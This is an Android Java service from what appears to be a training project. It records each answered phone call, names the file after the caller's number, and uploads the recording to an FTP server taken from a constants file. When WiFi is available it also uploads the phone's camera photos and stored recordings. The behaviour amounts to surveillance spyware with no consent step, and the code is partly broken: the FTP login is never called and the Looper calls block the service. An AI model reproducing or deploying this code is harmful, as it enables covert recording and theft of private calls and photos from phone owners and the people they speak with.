package com.tangcco170205_ftp.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.tangcco170205_ftp.Constants;
import com.tangcco170205_ftp.ftputils.FTPManager;
import com.tangcco170205_ftp.ftputils.ResultBean;
import com.tangcco170205_ftp.utils.AudioRecoderUtils;
import com.tangcco170205_ftp.utils.NetWorkUtil;

import java.io.File;
import java.io.IOException;

public class MyService extends Service {
    private static final int LOGIN_OK = 1;
    private AudioRecoderUtils recoderUtils;
    private Handler mHandler;
    //ftp上传核心类
    private FTPManager ftpManager;


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        initHandler();
        recoderUtils = new AudioRecoderUtils();
        recoderUtils.setOnAudioStatusUpdateListener(new AudioRecoderUtils.OnAudioStatusUpdateListener() {
            @Override
            public void onUpdate(double db, long time) {

            }

            @Override
            public void onStop(final String filePath) {
                //上传文件到服务器
                boolean wiFiConnected = NetWorkUtil.isWiFiConnected(getApplicationContext());
//                if (wiFiConnected) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        uplioad(filePath, "amr");
                    }
                }) {
                }.start();
                Toast.makeText(MyService.this, "上传录音文件成功", Toast.LENGTH_SHORT).show();
            }
        });


        TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

        manager.listen(new PhoneStateListener() {
            String incomingNumber = "";

            @Override
            public void onCallStateChanged(int state, String incomingNumber) {
                super.onCallStateChanged(state, incomingNumber);
                Toast.makeText(MyService.this, "来电", Toast.LENGTH_SHORT).show();

                switch (state) {
                    case TelephonyManager.CALL_STATE_RINGING:// 来电
                        this.incomingNumber = incomingNumber;
                        break;
                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        //录音
                        try {
                            recoderUtils.setFileName(incomingNumber);
                            recoderUtils.startRecord();
                        } catch (IllegalStateException e) {
                            e.printStackTrace();
                        }

                        break;
                    case TelephonyManager.CALL_STATE_IDLE:// 挂断电话后回到空闲状态
                        // mediaRecorder不等于null，停止录音
                        recoderUtils.stopRecord();


                }
            }
        }, PhoneStateListener.LISTEN_CALL_STATE);
    }

    private void initHandler() {
        Looper.prepare();

        mHandler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);
                boolean wiFiConnected = NetWorkUtil.isWiFiConnected(getApplicationContext());
                if (wiFiConnected) {
                    new PictureThread("/mnt/sdcard/DCIM").start();
                    new AudioThread("/mnt/sdcard/record").start();
                }
            }
        };


        Looper.loop();
    }

    private void uplioad(String pathname, String ext) {
        ResultBean resultBean = null;

        try {
            // 上传;
            resultBean = ftpManager.uploading(new File(pathname), FTPManager.REMOTE_PATH, ext);
            if (resultBean.isSucceed()) {
                Log.e("TAG", "uploading ok...time:" + resultBean.getTime()
                        + " and size:" + resultBean.getResponse());

            } else {
                Log.e("TAG", "uploading fail");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {


        return Service.START_STICKY;
    }

    private boolean login() {

        ftpManager = new FTPManager(Constants.hostName, Constants.userName, Constants.password);
        // 打开FTP服务
        try {
            ftpManager.openConnect();
//            Toast.makeText(this, "登陆成功", Toast.LENGTH_SHORT).show();
            mHandler.sendEmptyMessage(LOGIN_OK);
            return true;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }

    class PictureThread extends Thread {
        String path;

        public PictureThread(String path) {
            this.path = path;
        }

        @Override
        public void run() {
            uplioad(path, "jpg|png");
        }
    }

    class AudioThread extends Thread {
        String path;

        public AudioThread(String path) {
            this.path = path;
        }

        @Override
        public void run() {
            uplioad(path, "amr");
        }
    }

    class LoginThread extends Thread {
        @Override
        public void run() {
            //登录
            login();
        }
    }

}
